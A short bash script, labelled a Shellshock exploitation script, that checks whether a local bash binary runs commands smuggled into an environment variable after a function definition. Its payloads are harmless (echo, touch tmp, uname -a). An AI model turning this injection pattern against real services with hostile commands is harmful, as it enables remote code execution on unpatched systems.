#!/bin/bash
# Shellshock Exploitation Script

BASH_BIN=${1:-/bin/bash} # Uses the vulnerable-bash binary passed in. Otherwise, uses the default bash.

env x='() { :; }; echo VULNERABLE' $BASH_BIN -c "echo Hello"

env x2='() { :; }; touch tmp' $BASH_BIN -c 'echo Test'

env x3='() { :; }; uname -a' $BASH_BIN -c ':'